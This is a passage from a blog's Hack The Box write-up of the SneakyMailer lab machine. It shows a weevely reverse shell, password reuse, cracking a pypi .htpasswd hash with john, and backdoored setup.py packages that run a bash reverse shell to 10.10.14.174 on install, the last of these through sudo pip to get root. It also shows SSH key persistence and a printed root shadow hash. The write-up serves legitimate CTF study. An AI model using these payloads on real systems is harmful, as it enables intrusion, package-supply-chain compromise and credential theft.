+[+] Session:    /home/cyfun/.weevely/sessions/dev.sneakycorp.htb/agent_0.session
+[+] Shell:      System shell
+
+[+] Browse the filesystem or execute commands starts the connection
+[+] to the target. Type :help for more information.
+
+weevely&gt; :backdoor_reversetcp 10.10.14.174 8080
+Reverse shell connected, insert commands. Append semi-colon help to get the commands accepted.
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ id;
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre><h2 id=privilege-escalation-of-machine--from-www-data-to-developer>Privilege Escalation of Machine : from www-data to developer<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-www-data-to-developer>#</a></h2><pre tabindex=0><code>$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+low:x:1000:1000:,,,:/home/low:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ftp:x:107:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+postfix:x:108:116::/var/spool/postfix:/usr/sbin/nologin
+courier:x:109:118::/var/lib/courier:/usr/sbin/nologin
+vmail:x:5000:5000::/home/vmail:/usr/sbin/nologin
+developer:x:1001:1001:,,,:/var/www/dev.sneakycorp.htb:/bin/bash
+pypi:x:998:998::/var/www/pypi.sneakycorp.htb:/usr/sbin/nologin
+</code></pre><p>There are 2 users excluding roto that have a shell: low & developer.</p><p>Let&rsquo;s try the dev creds:</p><pre tabindex=0><code>$ su developer
+Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
+
+id
+uid=1001(developer) gid=1001(developer) groups=1001(developer)
+</code></pre><p>But the home directory of developer is <code>/var/www/dev.sneakycorp.htb</code>
+the flag is not here.</p><p>We may look elsewhere.</p><h2 id=privilege-escalation-of-machine--from-developer-to-low>Privilege Escalation of Machine : from developer to low<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-developer-to-low>#</a></h2><pre tabindex=0><code>ls -lh /home
+total 8.0K
+drwxr-xr-x 8 low   low   4.0K Jun  8 03:47 low
+drwx------ 5 vmail vmail 4.0K May 19 21:10 vmail
+
+ls -lhA /home/low
+total 40K
+lrwxrwxrwx 1 root root    9 May 19 21:09 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 low  low   220 May 14 05:46 .bash_logout
+-rw-r--r-- 1 low  low  3.5K May 14 05:46 .bashrc
+drwxr-xr-x 3 low  low  4.0K May 16 03:34 .cache
+drwx------ 3 low  low  4.0K May 14 13:21 .gnupg
+drwxr-xr-x 3 low  low  4.0K May 16 03:37 .local
+dr-x------ 2 low  low  4.0K May 16 03:30 .pip
+-rw-r--r-- 1 low  low   807 May 14 05:46 .profile
+drwxr-xr-x 2 low  low  4.0K Jun  8 03:47 .ssh
+-rwxr-x--- 1 root low    33 Nov  9 10:36 user.txt
+drwxr-xr-x 6 low  low  4.0K May 16 03:33 venv
+</code></pre><p>We already saw 2 references to pypi, now there is a venv folder own by low
+and in <code>/etc/passwd</code> an account named pypi which has a home folder named
+<code>/var/www/pypi.sneakycorp.htb</code>.</p><p>It seems the pe will go through venv/pypi.</p><pre tabindex=0><code>ls -lhA /var/www/pypi.sneakycorp.htb
+total 12K
+-rw-r--r-- 1 root root       43 May 15 14:29 .htpasswd
+drwxrwx--- 2 root pypi-pkg 4.0K Nov  9 12:19 packages
+drwxr-xr-x 6 root pypi     4.0K May 14 18:25 venv
+</code></pre><p>We can check the hash:</p><pre tabindex=0><code>cat /var/www/pypi.sneakycorp.htb/.htpasswd
+pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
+</code></pre><p>Let&rsquo;s see the kind of hash:</p><pre tabindex=0><code>$ haiti &#39;$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/&#39;
+MD5(APR) [HC: 1600]
+Apache MD5 [HC: 1600]
+</code></pre><pre tabindex=0><code>$ john hash.txt --wordlist=/usr/share/wordlists/passwords/rockyou.txt --format=md5crypt
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+soufianeelhaoui  (pypi)
+1g 0:00:00:27 DONE (2020-11-09 21:36) 0.03652g/s 130543p/s 130543c/s 130543C/s souhegan..souderton0
+Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+Session complete
+</code></pre><p>Let&rsquo;s add the new sub-domain to <code>/etc/hosts</code>.</p><pre tabindex=0><code>$ cat /etc/hosts | grep sneak
+10.10.10.197 sneakycorp.htb dev.sneakycorp.htb pypi.sneakycorp.htb
+</code></pre><p>On port 80 we have the same website as for sneakycorp.htb but on port 8080
+we can see an app called pypiserver. (<a href=http://pypi.sneakycorp.htb:8080/>http://pypi.sneakycorp.htb:8080/</a>)</p><blockquote><p>Welcome to pypiserver!</p><p>This is a PyPI compatible package index serving 0 packages.</p><p>To use this server with pip, run the following command:</p><pre><code>    pip install --index-url http://pypi.sneakycorp.htb/simple/ PACKAGE [PACKAGE2...]
+</code></pre><p>To use this server with easy_install, run the following command:</p><pre><code>    easy_install --index-url http://pypi.sneakycorp.htb/simple/ PACKAGE [PACKAGE2...]
+</code></pre><p>The complete list of all packages can be found <a href=http://pypi.sneakycorp.htb:8080/packages/>here</a> or via the <a href=http://pypi.sneakycorp.htb:8080/simple/>simple</a> index.</p><p>This instance is running version 1.3.2 of the <a href=https://pypi.org/project/pypiserver/>pypiserver</a> software.</p></blockquote><p>We can connect to the package index () basic auth
+with the cracked credentials <code>pypi</code> / <code>soufianeelhaoui</code>.</p><p>But no package is indexed yet.</p><p>RTFM. Letr&rsquo;s read the <a href=https://pypi.org/project/pypiserver/#uploading-packages-remotely>Uploading Packages Remotely</a> page
+of pypiserver documentation.</p><p>The first thing we will need to upload a package is <code>~/.pypirc</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=display:flex><span><span style=color:#66d9ef>[distutils]</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>index-servers</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>local</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>[local]</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>repository: http://pypi.sneakycorp.htb:8080/</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>username: pypi</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>password: soufianeelhaoui</span>
+</span></span></code></pre></div><p>And of course we will need <code>setup.py</code> for setuptools.</p><p>Let&rsquo;s look at the <a href=https://python-packaging.readthedocs.io/en/latest/minimal.html>Minimal Structure</a> required:</p><pre tabindex=0><code>cyfun/
+    cyfun/
+        __init__.py
+    setup.py
+</code></pre><p><code>setup.py</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> setuptools <span style=color:#f92672>import</span> setup
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>setup(name<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;cyfun&#39;</span>,
+</span></span><span style=display:flex><span>      version<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0.1&#39;</span>,
+</span></span><span style=display:flex><span>      description<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;cyfun de mon pwnage&#39;</span>,
+</span></span><span style=display:flex><span>      url<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;https://pwn.by/cyfun&#39;</span>,
+</span></span><span style=display:flex><span>      author<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;cyfun&#39;</span>,
+</span></span><span style=display:flex><span>      author_email<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;cyfun@example.com&#39;</span>,
+</span></span><span style=display:flex><span>      license<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;MIT&#39;</span>,
+</span></span><span style=display:flex><span>      packages<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;cyfun&#39;</span>],
+</span></span><span style=display:flex><span>      zip_safe<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
+</span></span></code></pre></div><p>Let&rsquo;s run <code>python setup.py sdist upload -r local</code> to package it and upload
+it.</p><p>Then we can see the package cyfun indexed and removed a few seconds later.
+Let&rsquo;s add a backdoor in the package.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> setuptools <span style=color:#f92672>import</span> setup
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
+</span></span><span style=display:flex><span>os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;echo &#39;bash -i &gt;&amp;/dev/tcp/10.10.14.174/8080 0&gt;&amp;1&#39; | /bin/bash&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>setup(name<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;cyfun&#39;</span>,
+</span></span><span style=display:flex><span>      version<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0.1&#39;</span>,
+</span></span><span style=display:flex><span>      description<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;cyfun de mon pwnage&#39;</span>,
+</span></span><span style=display:flex><span>      url<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;https://pwn.by/cyfun&#39;</span>,
+</span></span><span style=display:flex><span>      author<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;cyfun&#39;</span>,
+</span></span><span style=display:flex><span>      author_email<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;cyfun@example.com&#39;</span>,
+</span></span><span style=display:flex><span>      license<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;MIT&#39;</span>,
+</span></span><span style=display:flex><span>      packages<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;cyfun&#39;</span>],
+</span></span><span style=display:flex><span>      zip_safe<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
+</span></span></code></pre></div><p>Here we got a shell as low:</p><pre tabindex=0><code>$ low@sneakymailer:~$ id
+uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+,111(bluetooth),119(pypi-pkg)
+
+low@sneakymailer:~$ cat user.txt
+70ac4f2e6be3aece2eed49ecb6f80d7d
+</code></pre><h2 id=privilege-escalation-of-machine--from-low-to-root>Privilege Escalation of Machine : from low to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-low-to-root>#</a></h2><pre tabindex=0><code>$ printf %s &#39;ssh-rsa &lt;pubkey&gt; cyfun@penarch&#39; &gt;&gt; ~/.ssh/authorized_keys
+$ ssh -i ~/.ssh/id_rsa low@10.10.10.197
+</code></pre><p>Let&rsquo;s look for low hanging fruits:</p><pre tabindex=0><code>low@sneakymailer:~$ sudo -l
+sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
+Matching Defaults entries for low on sneakymailer:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User low may run the following commands on sneakymailer:
+    (root) NOPASSWD: /usr/bin/pip
+</code></pre><p>Let&rsquo;s create a very minimal backdoored package:</p><pre tabindex=0><code>low@sneakymailer:~$ mktemp -d
+/tmp/tmp.lIuPOXEbwZ
+low@sneakymailer:~$ cd /tmp/tmp.lIuPOXEbwZ
+low@sneakymailer:/tmp/tmp.lIuPOXEbwZ$ vim.tiny setup.py
+low@sneakymailer:/tmp/tmp.lIuPOXEbwZ$ sudo /usr/bin/pip3 install 
+</code></pre><p><code>setup.py</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> os
+</span></span><span style=display:flex><span>os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;echo &#39;bash -i &gt;&amp;/dev/tcp/10.10.14.174/8080 0&gt;&amp;1&#39; | /bin/bash&#34;</span>)
+</span></span></code></pre></div><p>When executed we retrieve the root shell:</p><pre tabindex=0><code>root@sneakymailer:/tmp/pip-req-build-lp_bvi48# id
+uid=0(root) gid=0(root) groups=0(root)
+root@sneakymailer:/tmp/pip-req-build-lp_bvi48# cd
+root@sneakymailer:~# cat root.txt
+602b7d042c33e19fdf079cfef493eb60
+root@sneakymailer:~# cat /etc/shadow | grep root
+root:$6$jJW2Iy0Knfw7c6gr$/p2MAEhr7Fy4bMIT8szzgnSkL2kp8EaPKvGQ//cfcX0bMnazYHzNwWIsGaGwgceFyftI2Xihj0rrhUbfkrzhf.:18402:0:99999:7:::
+</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/medium/>Medium</a></li></ul><nav class=paginav><a class=prev href=https://s4ch.github.io/writeups/hackthebox/worker/><span class=title>« Prev</span><br><span>Worker </span></a><a class=next href=https://s4ch.github.io/writeups/hackthebox/buff/><span class=title>Next »</span><br><span>Buff</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
